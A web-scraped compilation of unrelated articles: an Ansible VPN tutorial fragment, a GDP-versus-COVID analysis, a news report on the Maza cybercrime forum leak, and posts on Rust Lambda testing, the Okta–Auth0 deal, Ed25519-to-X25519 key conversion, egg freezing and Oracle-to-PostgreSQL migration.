it'll download and execute a shell script on GitHub that will clone 6 repos from GitHub to your `~/.pyenv` folder and prompt you to add a few lines to your shell's initialization script.</p><p>Follow the output prompt from above, which asks you to put lines like the below in your shell initialization script (e.g. `~/.bashrc` if you use the bash shell). Make sure to fill in your own username!</p><p>```bash<br>export PATH="/home/YOUR_USERNAME/.pyenv/bin:$PATH"<br>eval "$(pyenv init -)"<br>eval "$(pyenv virtualenv-init -)"<br>```</p><p>Install a recent python version:</p><p>```bash<br># List available python versions<br>pyenv install --list</p><p># Install a specific version<br>pyenv install 3.9.2</p><p># (Suggested) If you want to always use that version when running `python`<br># in your terminal<br>pyenv global 3.9.2<br>```</p><p>If you want, you can also create a [virtualenv](https://virtualenv.pypa.io/en/latest/) to further isolate the Ansible installation, and make that virtualenv automatically activate when you're in a particular folder/repo. That would look like:</p><p>```bash<br># (Optional)</p><p># Feel free to pick a different virtualenv name than "ansible-tutorial"<br>pyenv virtualenv 3.9.2 ansible-tutorial</p><p># Create a .python-version file that pyenv will find when your shell is in the <br># same directory (or a sub-directory) and automatically activate the named<br># virtualenv<br>pyenv local ansible-tutorial<br>```</p><p>Install the `ansible` pip package, which will install various command-line tools, including `ansible-playbook`, which we'll use to run a "playbook" of commands that will set up a VPN server and client for us.</p><p>```bash<br>pip install ansible</p><p># Confirm installation worked<br>ansible --version<br>```</p><p># Get a Server</p><p>To use Ansible for a VPN server, we need... a server! Ansible could provision a server from a cloud provider for us (and I'll touch on this briefly later), but we'll keep our playbook hardware-provider-agnostic for now, so you can run it as easily against a cloud server as a Raspberry Pi on your home network. I'm going to [create a $5/month DigitalOcean droplet](https://www.digitalocean.com/docs/droplets/how-to/create/) to test against, but you could also [use Vagrant](https://docs.ansible.com/ansible/latest/scenario_guides/guide_vagrant.html) (to test against a local VM) or any server you can SSH to.</p><p>Testing Ansible playbooks against VMs, rather than a bare-metal machine, comes with an advantage — after you've written the playbook, you can start a new, empty VM and test the whole playbook start to finish to ensure that it works consistently.</p><p># Connecting to the Server with Ansible</p><p>Once you have your server or VM, take note of its IP address use it to create an `inventory.ini` file like the below:</p><p>```<br>[vpn]<br>vpn_server ansible_host=203.0.113.1 ansible_user=root<br>```</p><p>An [inventory file](https://docs.ansible.com/ansible/latest/user_guide/intro_inventory.html) tells Ansible what servers it can act upon and how to access them. Let's use the above inventory file as an example. When we run Ansible and target the `vpn` **group** of servers or the `vpn_server` **host**, it will try to connect to the server using a command like:</p><p>```bash<br>ssh root@203.0.113.1<br>```</p><p>So, if you can't SSH to the server, then Ansible won't be able to connect either!</p><p>Connecting to the server with an SSH key is strongly recommended! [Add your SSH key to your server](https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-2) to connect without needing a password. If you must connect with a password, you can `sudo apt install sshpass` and then provide your SSH password when using Ansible by adding the `--ask-pass` flag to all ansible commands.</p><p>Let's test to make sure that Ansible can connect to the server:</p><p>```bash<br>ansible -i inventory.ini -m ping vpn<br>```</p><p>This runs the [ping Ansible module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/ping_module.html), targeting the `vpn` group of servers. You should see "pong" in the output, meaning that Ansible could connect to the server and the server has a Python installation that Ansible can use.</p><p># Ansible's Built-in Variables and Facts</p><p>There are other useful Ansible modules that we can use with the `ansible` command:</p><p>- The [setup module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/setup_module.html) fetches [system information, also known as "facts"](https://docs.ansible.com/ansible/latest/user_guide/playbooks_vars_facts.html), about the server. You can use these facts as variables in Ansible commands and playbooks.<br>- The [debug module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/debug_module.html) can evaluate variables, which is useful for... well, debugging!</p><p>Try running both of these modules with your server so you can see what facts and information Ansible makes available:</p><p>```bash<br>ansible -i inventory.ini -m setup vpn<br>ansible -i inventory.ini -m debug -a "var=hostvars" vpn<br>```</p><p>This was one of the most confusing parts for me when learning Ansible — figuring out what all these built-in variables and facts (like `groups`, `inventory_dir`, and `ansible_distribution`) were and how to find them.</p><p># Writing an Ansible Playbook</p><p>The `ansible` command lets you run [ad-hoc …</p></div></div>

<p>Last year was a historically bad year for many reasons, but to economists that badness is most visible in our widest measure of the economy: Gross Domestic Product. All issues with GDP aside, especially as a perfect measure of relative living standards, the annual real (inflation-adjusted) growth rate of GDP gives us a good picture of how much national economies were harmed by the pandemic, private behavior changes, and government restrictions (disentangling these three effects is hard — I will leave that to the academic journals rather than a blog post).</p>



<p>While GDP is reported with a lag of several months and is subject to revision, many countries have now reported full GDP data for 2020. For those that don’t follow GDP very closely, for a developed country an annual rate of growth of about 2% is pretty normal and respectable. For further context, in the US recent recessions had declines of -2.5% in 2009, -0.1% 1991, and -1.8% in 1982 (the 2001 recession never had an annual decline, only a few quarterly declines). While it is unusual for countries to go more than 10 years without a decline, it does happen. For example, Australia’s last annual decline was in 1991, when it declined -1.3%. But that’s unusual.</p>



<p>This chart shows the 2020 GDP growth rates (mostly negative, with one exception — Taiwan) for 2020 for most countries were I could find data. What this number shows us is the total amount of economic activity in 2020 compared with the total amount of economic activity in 2019 (adjusted for inflation, of course). I believe this is a better measure than others you might see, such as data that compares the level in the 4th quarters of 2020 and 2019 (a country could have had a terrible 2nd quarter but still gotten back close to the prior year level, and a simple Q-over-Q measure would miss that decline). As I did for the <a href="https://economistwritingeveryday.com/2020/11/18/third-quarter-check-in-covid-and-gdp/" target="_blank" rel="noreferrer noopener">3rd quarter data</a>, this chart also plots the cumulative COVID-19 death rates on the vertical axis.</p>

COVID-19 death data is from Our World in Data.</em></figcaption></figure>



<p>What can we learn from this data?</p>



<p>First of all, I would caution any suggestions about causation between these two numbers. The both reflect the same basic fact: how hard a country was hit by the pandemic. A country like Australia or Taiwan that performed well on both economic and health measures got these outcomes for the same reason: the weren’t hit hard by the pandemic. I will leave aside in this post questions about how much of this is due to government policy and how much of that policy could have been replicated in other countries. But Australia, Taiwan, and South Korea were, for a variety of reasons, able to avoid being hit hard by the pandemic.</p>



<p>Here is one thing that jumps out at me from the data: there are a large number of countries that had GDP declines between -2% and -4%, a level that is certainly bad but is not outside the range of a “normal” recession. But within this band of -2% to -4%, total COVID deaths range tremendously, from just 135 deaths per million people in Finland to over 1500 deaths per million in the US, or over 10 times as many. Notably also Sweden is almost 10 times Finland’s death rate and over 3 times Denmark’s death rate.</p>



<p>Could Sweden have looked more like Denmark and Finland with slightly different policies? Could the US? These questions have already been debated endlessly, and I suspect they will continue to be debated. It’s a question that is really hard to ever answer definitively, but it is worth asking.</p>



<p>Another pattern I notice is that many major Western European countries nicely fit on a line that extends from the worst outcome in the UK down through Italy, France, Germany, Denmark, and finally the best outcome in Norway. Among the largest European nations, only Spain does not fit perfectly on this line, though they are close. Once again, don’t infer too much about causation. For a variety of reasons that we don’t fully understand right now (and maybe never will, but science will try) the United Kingdom was hit especially hard. Both their economy and their health suffered considerably.</p>



<p>Could the UK, with fewer government restrictions, have ended up in a similar position to Belgium and Czechia? Those two countries also were hit extremely hard by the pandemic, but Czechia’s GDP decline was at least only half as bad as the UK. Or, without the government restrictions, would deaths have been even higher in the UK? That might seem unfathomable, but it is not. Right now 13 states in the US, with a combined population of 80 million people, have higher COVID death tolls than the UK, in some cases dramatically more (such as New Jersey, which is 45% higher than the UK).</p>



<p>We probably don’t need to say this again, but I will: 2020 was a really bad year. We are now starting to get a complete picture of just how bad it was. The variation across countries, and in some cases within countries or <a rel="noreferrer noopener" href="https://twitter.com/jmhorp/status/1366984212818059265" target="_blank">even with large US states</a>, is so large that social scientists will continue to study this issue for years to try and learn more about the causes. But let’s be cautious about quick analyses posted online now which claim they have identified the cause, or that there was no cause, only bad luck or demographic factors. Causation is a tricky thing to figure out.</p>

March 4, 2021 | https://therecord.media/maza-cybercrime-forum-hacked-user-data-dumped-online/ | <a href="https://web.archive.org/web/*/https://therecord.media/maza-cybercrime-forum-hacked-user-data-dumped-online/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    
<p>A hacker has breached Maza Faka, one of the oldest underground cybercrime forums active today, shut down its Tor-based website, and leaked the details of around 3,000 users in a PDF file posted on the forum’s front page.</p>



<p>The security breach, which took place yesterday, on March 3, 2021, resulted in the leak of sensitive details about the forum’s registered users.</p>



<p>According to a copy of the leaked PDF file obtained by <em>The Record</em>, details such as usernames, emails, account passwords, and social media IDs (ICQ, Skype, AIM, MSN, and Yahoo) were posted online.</p>



<p>Additionally, the PDF file also contained information about each user’s certificate file and certificate password, which the Maza forum was using as a form of a two-step verification process.</p>



<figure><img loading="lazy" width="1000" height="940" src="https://www-therecord.recfut.com/wp-content/uploads/2021/03/Maza-hacked.png" alt="" srcset="https://therecord.media/wp-content/uploads/2021/03/Maza-hacked.png 1000w, https://therecord.media/wp-content/uploads/2021/03/Maza-hacked-300x282.png 300w, https://therecord.media/wp-content/uploads/2021/03/Maza-hacked-768x722.png 768w" sizes="(max-width: 1000px) 100vw, 1000px"></figure>



<p>But while the Maza leak is small in size compared to other data breaches this year, it is likely one of the most important security incidents of 2021, as it has led to the broad exposure of data that may aid law enforcement agencies in tracking down former or current cybercriminals.</p>



<p>Dmitry Smilyanets, a threat intelligence analyst at <a href="https://www.recordedfuture.com/">Recorded Future</a> who helped <em>The Record</em> analyze the Maza data, said the PDF file contains authentic information, which he was able to use to link several Maza users to public social media profiles.</p>



<figure><img loading="lazy" width="988" height="390" src="https://www-therecord.recfut.com/wp-content/uploads/2021/03/social-media-profile.png" alt="" srcset="https://therecord.media/wp-content/uploads/2021/03/social-media-profile.png 988w, https://therecord.media/wp-content/uploads/2021/03/social-media-profile-300x118.png 300w, https://therecord.media/wp-content/uploads/2021/03/social-media-profile-768x303.png 768w" sizes="(max-width: 988px) 100vw, 988px"></figure>



<h2><strong>End of the “forum era”</strong></h2>



<p>Threat intelligence firm Flashpoint, which also spotted the Maza hack earlier today, said in a <a href="https://www.flashpoint-intel.com/blog/breelite-cybercrime-forum-maza-breached-by-unknown-attacker/">blog post</a> that multiple members of the underground cybercrime community are now discussing moving away from using emails as a means to register profiles, as these can be easily tracked back to their real-world identities.</p>



<p>Furthermore, Smilyanets told <em>The Record</em> that in Telegram channels, several respectable threat actors are now calling for an end to the “forum era.”</p>



<p>These calls come after several major underground forums had suffered similar security breaches over the past few months. This includes:</p>



<ul><li><strong>Joker’s Stash</strong> – has <a href="https://www.zdnet.com/article/jokers-stash-the-internets-largest-carding-forum-is-shutting-down/">recently shut down</a> after the FBI and Interpol <a href="https://www.zdnet.com/article/fbi-interpol-disrupt-jokers-stash-the-internets-largest-carding-marketplace/">seized four of its proxy servers</a> in December 2020.</li><li><strong>Verified </strong>– was temporarily <a href="https://www.flashpoint-intel.com/blog/new-mysterious-operators-usurp-elite-russian-hacker-forum-verified/">hacked and shut down</a> after hackers tricked the forum’s domain registrar into handing over control over the site’s domain to a threat actor.</li><li><strong>Exploit </strong>– suffered a security breach this week after hackers <a href="https://krebsonsecurity.com/2021/03/three-top-russian-cybercrime-forums-hacked/">hijacked one of its DDoS mitigation solutions</a>.</li></ul>



<p>But among all these, Maza stands head and shoulders above the others, mainly due to the severity of its breach but also due to its long-standing reputation in the Russian-speaking cybercrime underground.</p>



<h2><strong>One of the most reputable cybercrime forums today</strong></h2>



<p>While unknown to the general reader, the Maza Faka forum is one of the oldest, if not the oldest, cybercrime portals active today.</p>



<p>The forum, which launched way back in 2003, has served for almost two decades as a place to trade stolen card details (an activity called “carding”), but also functioned as a marketplace to advertise other services like e-commerce fraud, bank fraud, and cash-out services.</p>



<p>Access to the forum has always been limited to a selected few.</p>



<p>“Registering on the forum requires a significant upfront fee, as well as several vouchers from current members who are in good standing on the forum and become financially responsible for the invited person in the case of disputes,” Smilyanets told <em>The Record</em>.</p>



<p>“Primarily attributed to such a strict registration policy, monetary disputes are rare compared with most other forums. As a result, only senior and established members of the hacking underworld are capable of gaining access.”</p>



<p>But, according to a Recorded Future threat intel bulletin, the forum’s activity has waned in recent years, and new card breaches or POS malware strains were rarely posted on the site anymore.</p>



<p>Today, the Maza forum primarily serves as a reputation index for the top dogs of the cybercrime underground, many of whom use their Maza profiles to vouch for their reputations.</p>



<p>As a result, any information on Maza users leaked this week might help uncover years-worth of cybercrime campaigns and some of the oldest and long-standing threat actors today.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>In the system I'm building there are a significant amount of SQS messages that need to be processed asynchronously and Lambda is a really good fit for that. It is perfect for spiky workloads. You can control max parallelism easily. And it now has a native integration where Lambda functions are invoked with pending SQS messages without any extra work on your part.</p>
<p>Lambda's great. I think it's time to declare it boring. In the "choose boring technology" sense. As in it's a robust and well-worn solution.</p>
<p>But a significant problem I had was that most of my code is Rust. The Lambda experience with the major languages (e.g. Python) is categorically better. There are fewer gotchas, many more examples, and it seems especially true when trying to use the higher level tooling out there which I will get into in a minute.</p>
<p>Re-writing the pieces in another language like Python was not tempting as these Lambda functions are handling all the same data structures, re-using business logic, and calling the same dependencies as the main code base. It could be done, of course. But having multiple pieces of code doing the same things can be a giant hassle/waste (for small teams especially). And Rust is just far more maintainable to me.</p>
<p>Those reasons to stick with Rust outweighed any deployment inconveniences or performance arguments. </p>
<p>Performance-wise, Rust is surely faster than my main other candidate Python. So, maybe I'd pay significantly less money in the long run? Especially now that Lambda is billing at 1ms increments? I love that this happened but it's not really a significant factor in this case. The actual processing time is dominated by calling SQS, gRPC services, and/or DynamoDB.</p>
<p>Cost decisions all depend on the use case and expected load, of course, but the difference I projected is a not significant problem to me in the real dollars it would translate to. Something like Python would be completely fine here. I projected it would only increase the 30-40ms average runtime by around 10%. Waiting around is pretty efficient in any language. The great news recently was Lambda moving from 100ms billing increments to 1ms: a boon here regardless of the programming language. Very cool.</p>
<p>On a related note, I'm about to create something with Cloudflare Workers (using Rust/wasm) and that's quite a different billing model. Unlike Lambda, if you're awaiting subrequests, it doesn't actively count against your CPU time for that invocation. Sweet. It comes with trade-offs, of course. I'll probably write about what I learn in the future. I bet I'm adopting it for the directly customer-facing layer as my experiments so far on that platform have been pretty positive.</p>
<p>For Lambda and Rust, I ended up trying a number of the higher level frameworks and tools. The biggest factors in the decision were the deployment and testing support. I don't mind some setup pain if there are safe deployment mechanisms and fast, local testing that very closely approximates the real environment.</p>
<p><a href="https://www.serverless.com/">Serverless</a> and <a href="https://aws.amazon.com/serverless/sam/">AWS SAM</a> are the two big ones that work with Rust and provide some local testing capability. There are a lot of other Python-centric ones. If you take local/mock testing out of the requirements, there are also some good infrastructure-as-code options: I'm eventually going to investigate CDK, Terraform, and Pulumi (which I use elsewhere). I have limited time and can't research a comprehensive survey of all of the options, unfortunately. I wish I could.</p>
<p>Fast iteration while developing is really important to me but none of those frameworks were fast for testing. The CLIs themselves take multiple seconds to respond for even simple tasks. Once Rust is involved, you're now into cross-compiling (to <a href="https://doc.rust-lang.org/edition-guide/rust-2018/platform-and-target-support/musl-support-for-fully-static-binaries.html">musl</a>) and on top of that delay the frameworks are building/using Docker containers behind the scenes to run the tests. For a week or so, I was just running the lambci Docker image directly in automated integration tests, but that was not cutting it either. Still all too slow, the cross-compilation especially.</p>
<p>I ended up eschewing the frameworks altogether for local testing which is what I mainly want to write about.</p>
<p>There's now a thin layer that intakes SQS messages and parses the JSON payload into a strongly typed Rust data structure. This is in the <code>bootstrap</code> binary that Lambda runs. It reads environment variables for configuration. Locally, there's a completely separate binary that reads configurations from a dynamically generated file and polls for messages from a Redis queue (using LPOP/BLPOP). In both cases, the parsed queue payload is pushed into the 'real' code base which is identical in both cases. A classic "shim":</p>
<p><img src="https://www.peakscale.com/serverless-rust.png"></p><p>It's worked out well. I folded it into the same test framework that I wrote for traditional services. Redis is just another process that is launched from a group blueprint. The framework can launch groups of arbitrary binaries (either my own artifacts or system binaries like Redis) and Docker containers. Unique ports are reserved on the fly (via a SQLite database that is unique to each node) and written into the dynamically created configuration files. The processes can discover each other by role name so that you don't have to test one process at a time and mock dependencies - they can work together just as they would in the real system. The integration test itself can look up the same configurations and feed the test messages into Redis.</p>
<p>Importantly, many groups can be launched simultaneously, i.e., each integration test can launch its own group of processes. I can have hundreds of these running thousands of Unix processes even on my laptop. The Unix process model works quite well. Use it!</p>
<p>And that means cross-compiling to musl only happens for real deployments to Lambda. Anything I'm in the middle of coding is incrementally compiled and local (either OSX or Linux). The tests can be run nearly instantly. Both Redis and Rust binaries are extremely fast to execute and get to an operational state. The actual process wrangling is handled by the extremely fast <a href="http://smarden.org/runit/">runit</a> set of tools which the group management code triggers. No more waiting on those Lambda testing framework's slow local testing or, worse, actually deploying to Lambda to get basic iterative feedback.</p>
<p>It's just unacceptable to me to wait more than a few seconds. Anything that requires more time tends to mean you get sucked into some distraction. When I'm coding I want to stay in the flow of it. Getting instant feedback from testing is awesome. Getting instant feedback from tests that are running exactly the same thing as production? That is just perfect. Unfortunately in this case, unlike my web services, it required faking something out (substituting Redis in for SQS) but I think it's low risk.</p>
<p>Even so, before final deployment I still choose to run the test suite against something with almost exact parity as production (basically only differing from production in stored database data). There could always be some difference. On teams I've been on, we've caught a few problems in those stages.</p>
<p>I also believe in the 'testing in production' ideas out there, to an extent. As long as we're not talking about <em>only</em> testing in production which usually makes no sense. There are still a number of problems you can catch ahead of time with a stage right before production that matches the infrastructure. In my case it's going to add around 10 minutes per actual deployment and I'm just fine with that given that it's automated and the potential value from avoiding an outage. But everyone has their own trade-offs to think about (<a href="https://www.peakscale.com/context/">context</a> matters).</p>
<p>Meanwhile both my local development flow and the longer full integration test suite were both sped up massively.</p>

              <p>This week, <a href="https://auth0.com/">Auth0</a> was acquired by <a href="https://www.okta.com/">Okta</a>, the largest company in the Identity &amp; Access Management space. &nbsp;After being founded in only 2014 and sold for a cool $6.5 billion, this is yet another example of how technology is increasingly being adopted by developers and finding it's way into the business in a bottom-up fashion.</p><h2 id="what-is-identity-access-management">What Is Identity &amp; Access Management?</h2><p>Many of the applications which you use or develop will be protected with username and password access. &nbsp;The username represents your individual <em>identity,</em> which will control how you are allowed to use the system and the data that you have access too, and the password of course controls your access to that identity.</p><p>It may seem that developing a username and password function is simple, but in reality there is a lot of effort and complexity to this. &nbsp;Not only do you need to implement the login feature, but also the logouts, password resets, multi-factor authentication, social logins and the ability to disable users to name just a few. Being authentication related, all of this needs to be developed securely, which is a skill in itself.</p><p>At an enterprise level, businesses also need to control access across an entire portfolio of applications, ensuring that the right people in the right job roles have access to the right systems. &nbsp;Technically, this will often mean that we need to develop integration between applications, internal directories and single sign on systems so that these things can be controlled and audited centrally. &nbsp;This is further development which needs to take place, none of which really adds value to your users.</p><p>Whilst implementing Identity &amp; Access Management does require lots of work and complexity, it is a task which overlaps greatly from application to application and organisation to organisation. &nbsp;Therefore, there have been a number of solutions developed which provide this through either on premise software deployment or more recently as a service.</p><p>Example products in this space include <a href="https://www.pingidentity.com/">Ping Identity</a> and <a href="https://www.okta.com/">Okta</a>. &nbsp;Both of these products and organisations started life and still punch hardest in the enterprise space, where the task is to protect thousands of applications and tens of thousands of users in a secure, controlled and compliant way. &nbsp;And historically they have done a good job at this, jointly protecting billions of user accounts.</p><h2 id="the-auth0-approach">The Auth0 Approach</h2><p>Rather than focus directly on enterprise, the Auth0 approach and their ultimate success was very much to focus on winning developer mindshare with a bottom-up adoption and sale.</p><p>Auth0 allows developers to drop in the identity and access management features directly into their applications, avoiding all of the development work whilst ensuring a secure implementation. &nbsp;The experience for developers is very good, and the frontend highly customisable so that security can be implemented without restricting their user experience. &nbsp;All of the documentation, guides and presentation are also oriented towards developers, and the business is very culturally aligned and tuned into the development community.</p><p>For all of these reasons, developers have flocked to Auth0 as their preferred solution for Identity &amp; Access Management.</p><p>In addition, whereas the competition are very enterprise focussed in their approach, Auth0 is much more consumer focussed. &nbsp;For instance, rather than being the technology by which enterprises secure their internal line of business applications, Auth0 has historically more naturally been at home when used in websites and mobile applications aimed at consumers. &nbsp;</p><p>Ultimately, Okta have concluded that these are both trends they need to buy into in todays developer led and digital world. &nbsp;</p><h2 id="what-can-we-learn-from-this">What Can We Learn From This?</h2><p>As technology leaders, the success and rapid adoption of Auth0 shows how new technology is increasingly entering the organisation through developers, who are consuming SaaS services and baking them into their applications. &nbsp;Of course this brings risk and governance considerations, but also shows how companies need to change to allow and support this innovation if they are to remain competitive. </p><p>The success of Auth0 also shows how enterprise IT is being turned inside out, taking previously internal line of business applications and data, and exposing this outside of the business so users and consumers can interact with it through digital channels. &nbsp;This is the flip side of consumerisation of enterprise IT, where we are taking enterprise IT and enabling it for direct use by customers. </p><p>Finally, this is of course another example of the rapid digitisation of the world economy, where companies are building more web and mobile applications. Intelligent consumption of developer accelerators and SaaS services like Auth0 is really necessary to get to market quickly and remain competitive. &nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <!--kg-card-begin: markdown--><p><a href="https://twitter.com/Benjojo12">@Benjojo12</a> and I are building <a href="https://docs.google.com/document/d/11yHom20CrsuX8KQJXBBw04s80Unjv8zCg_A7sPAX_9Y">an encryption tool</a> that will also support SSH keys as recipients, because everyone effectively already publishes their SSH public keys <a href="https://github.com/FiloSottile.keys">on GitHub</a>.</p>
<p>For <a href="https://tools.ietf.org/html/rfc8332">RSA keys</a>, this is <a href="https://eprint.iacr.org/2011/615.pdf">dangerous</a> but straightforward: a PKCS#1 v1.5 signing key is the same as an OAEP encryption key.</p>
<p><a href="https://tools.ietf.org/html/draft-ietf-curdle-ssh-ed25519-ed448-08#section-4">Ed25519 keys</a>, though, are specifically made to be used with <a href="https://tools.ietf.org/html/rfc8032">EdDSA, the Edwards-Curve Digital Signature Algorithm</a>. To encrypt to them we'll have to choose between converting them to X25519 keys to do Ephemeral-Static Diffie-Hellman, and devising our own Diffie-Hellman scheme that uses Ed25519 keys.</p>
<p>While the latter is a totally viable strategy—you can do Ephemeral-Static Diffie-Hellman on twisted Edwards curves—I wanted to reuse the X25519 codepath, so I opted for the former.</p>
<p>First, we need to understand the difference between Ed25519 and X25519. For that I recommend <a href="https://eprint.iacr.org/2017/212.pdf"><em>Montgomery curves and their arithmetic</em></a> by Craig Costello and Benjamin Smith, which is where I learned most of the underlying mechanics of Montgomery curves. The high level summary is that <strong>the twisted Edwards curve used by Ed25519 and the Montgomery curve used by X25519 are <em>birationally equivalent</em></strong>: you can convert points from one to the other, and they behave the same way. The main difference is that on Montgomery curves you can use the Montgomery ladder to do scalar multiplication of x coordinates, which is fast, constant time, and sufficient for Diffie-Hellman. Points on the Edwards curve are usually referred to as <code>(x, y)</code>, while points on the Montgomery curve are usually referred to as <code>(u, v)</code>.</p>
<p>RFC 7748 conveniently <a href="https://tools.ietf.org/html/rfc7748#page-5">provides</a> the formulas to map <code>(x, y)</code> Ed25519 Edwards points to <code>(u, v)</code> Curve25519 Montgomery points and vice versa.</p>
<pre><code>(u, v) = ((1+y)/(1-y), sqrt(-486664)*u/x)
(x, y) = (sqrt(-486664)*u/v, (u-1)/(u+1))
</code></pre>
<p>So that's what a <a href="https://tools.ietf.org/html/rfc7748#section-5">X25519 public key</a> is: a u coordinate on the Curve25519 Montgomery curve obtained by multiplying the basepoint by a secret scalar, which is the private key. An <a href="https://tools.ietf.org/html/rfc8032#section-5.1.5">Ed25519 public key</a> instead is the compressed encoding of a <code>(x, y)</code> point on the Ed25519 Edwards curve obtained by multiplying the basepoint by a secret scalar derived from the private key. (An Ed25519 private key is hashed to obtained two secrets, the first is the secret scalar, the other is used elsewhere in the signature scheme.)</p>
<p>If we use the same secret scalar to calculate both an Ed25519 and an X25519 public key, we will get two points that are birationally equivalent, so we can convert from one to the other with the maps above. There is one catch though: you might have noticed that <strong>while we have both x and y coordinates for the Ed25519 public key, we only have the u coordinate for the X25519 key</strong>. That's because u coordinates are enough to do Diffie-Hellman (which is the core insight of Curve25519).</p>
<p>For every valid u coordinate, there are two points on the Montgomery curve. The same is true of y coordinates and the Edwards curve. (When you use the birational map, y coordinates map to u coordinates and vice-versa.) That's why we can encode Ed25519 public keys as a y coordinate and a "sign" bit in place of the full x coordinate.</p>
<p>This means that for each X25519 public key, there are two possible secret scalars (<code>k</code> and <code>-k</code>) and two equivalent Ed25519 public keys (with sign bit 0 and 1, also said to be one the negative of the other).</p>
<p>By the way, this all works because the basepoints of the Montgomery and Edwards curves are equivalent. Interestingly enough, the spec made a mistake and picked the wrong v coordinate for the Montgomery basepoint, so that the Montgomery basepoint maps to the negative of the Edwards basepoint. <a href="https://www.rfc-editor.org/errata/eid4730">It's fixed in an errata</a> but no one cares about Montgomery v coordinates anyway.</p>
<p>It should be mentioned that there is precedent for converting keys between the two curves: <a href="https://signal.org/docs/specifications/xeddsa/">Signal's XEd25519</a>. They do the opposite of what we want to do though, they use an X25519 key for EdDSA. That comes with an issue: an X25519 public key does not carry a v coordinate, so it can map to two Ed25519 keys. They solve it by defining the Edwards point sign bit to be 0, and then negating the Edwards secret scalar if it would generate a point with positive sign. (It also comes with more issues due to not having the other secret that you derive from an EdDSA private key, but that's out of scope. I like the diagram in <a href="https://blog.mozilla.org/warner/2011/11/29/ed25519-keys/">this blog post</a> if you are curious.)</p>
<p>I recommend reading both <a href="https://signal.org/docs/specifications/xeddsa/#elliptic-curve-conversions">section 2.3 of the XEdDSA spec</a> and <a href="https://crypto.stackexchange.com/a/62881/6740">this StackExchange answer</a> if things don't feel clear at this point.</p>
<p>Getting back to our use case, it turns out that it's pretty easy to use an Ed25519 public key for X25519, because <strong>an Ed25519 public key maps to a single X25519 public key</strong>, and the Ed25519 secret scalar will be one of the two valid X25519 private keys for that public key.</p>
<p>To encrypt, we take the y coordinate of the Ed25519 public key and we convert it to a Montgomery u coordinate, which we use as an <a href="https://tools.ietf.org/html/rfc7748#section-5">X25519</a> public key for Ephemeral-Static Diffie-Hellman.</p>
<pre><code>u = (1 + y) / (1 - y)

ephemeral_secret = read(/dev/urandom, 32)
ephemeral_share = X25519(ephemeral_secret, BASEPOINT)
shared_secret = X25519(ephemeral_secret, u)
</code></pre>
<p>To decrypt, we derive the secret scalar <a href="https://tools.ietf.org/html/rfc8032#section-5.1.5">according to the Ed25519 spec</a>, and simply use it as an X25519 private key in Ephemeral-Static Diffie-Hellman.</p>
<pre><code>secret_scalar = SHA-512(Ed25519_key)[:32]
shared_secret = X25519(secret_scalar, ephemeral_share)
</code></pre>
<p>The two peers might end up with different v coordinates, if they were to calculate them, but in X25519 the shared secret is just the u coordinate, so no one will notice.</p>
<p>What remains open for future work is checking for cross-protocol attacks. The only one that really concerns me is if a partial decryption oracle (where you can submit files to an endpoint and it will tell you if they decrypt successfully) allows generating an Ed25519 signature that can be used to log in to an SSH server. I can't see such an attack, but if you can, <a href="https://twitter.com/FiloSottile">let me know on Twitter</a>.</p>
<p>P.S. Looks like libsodium already <a href="https://libsodium.gitbook.io/doc/advanced/ed25519-curve25519">supports this kind of Ed25519 to Curve25519 conversion</a>, which is great as it makes it easy for languages with libsodium bindings (most of them) to implement <em>age</em>, and it gets us something to test against.</p>

				<p>Because of our biological clocks, women need to consider the timing of children a lot more urgently than men.</p><p>Startups take much longer than you’d think before they become successful. You should have a 5-10 year horizon, at least.</p><p>And the period between when you start the startup and when you can relax a little is grueling and all-consuming. The focus that’s required at first will probably force you to cut back on almost everything in your life, making a healthy work/life balance nearly impossible.</p><p>Startups are also unpredictable. In the early stages, you can’t plan too far in the future and arrange your life neatly around your plans, as you might with a job as an employee in the corporate world.</p><p>So you are working around the clock—so busy that you can’t focus on much outside of work, not knowing what startup disaster is around the corner, and maybe with no end in sight for years. But you know you want a family someday, either with your current partner or someone you haven’t even had the time to meet yet.</p><p>Because startups can cause you to neglect much of your own life, women founders need to be really proactive about their fertility. Especially if you want to buy more time before the window shuts on your childbearing years.</p><p>My advice: Freeze your eggs/embryos.</p><p>I wish I had. Life with my company whizzed by and it wasn’t until my late 30s when I had a child. After a year, I started working on baby #2. Three miscarriages later, I finally woke up to the urgency of the situation and went to a fertility doctor.</p><p>The next few years were consumed by IVF cycles. My obsession to have another baby grew with each failed cycle. I’d be on an emotional roller coaster waiting for the various results, praying that this time was the magical one. It never was. My eggs were just too old, I think. After 8 rounds with not one viable embryo to transfer, I decided I had to move on, to focus on my kid and all the really great things in my life. But the what-ifs still haunt me, privately.</p><p>Aspects of getting your eggs retrieved and/or frozen can be really awful. It’s extremely expensive if not covered by your medical insurance. The drugs can wreak havoc on moods and emotions. Between all the doctor’s appointments and the various shots (which cause serious bruising) you have to give yourself several times each day, it’s quite time consuming. &nbsp;And it’s stressful. At least it was for me. The stakes feel so high.</p><p>But nothing is as awful as it not working out. It’s a type of depressing that’s difficult to describe concisely.</p><p>It might seem weird or somehow frivolous to freeze your eggs—and especially to freeze embryos if you’re already married. (Though it’s becoming more mainstream as companies offer egg freezing as an employee benefit.) But freezing is worth it simply because it gives you more options as you get older.</p><p>Until they go through it themselves, few people realize how hard Mother Nature can be in the fertility department. The older you are, the tougher the blows. So if you want a biological child, the best thing you can do is prepare. You don’t want to be like me and wake up one day and it’s too late.</p>

					<div><p>While migrating from Oracle to PostgreSQL, most of the developers ask about the options available in Handling Global associative arrays in PostgreSQL. It might get challenging if the variables need to be accessible in the Exception block. To avoid developers from finding it difficult while performing conversions of PL/SQL from Oracle to PostgreSQL, we are writing this blog post to demonstrate the workarounds available with not much of additional programming effort. <img loading="lazy" src="https://www.migops.com/blog/wp-content/uploads/2021/02/Word-Art.jpeg" alt="" width="500" height="343"></p>
<p>By the way, the fact to note after reading this blog post is that, several features you want to observe in PostgreSQL during migrations or Code conversions are available without the need of an additional Enterprise license with PostgreSQL (which could create a vendor lock-in).</p>

<p>Ask us about possibilities with Community PostgreSQL (Open Source) before switching to an Enterprise licensing. 🙂</p>

<p><b>What is an Associative Array ?</b></p>
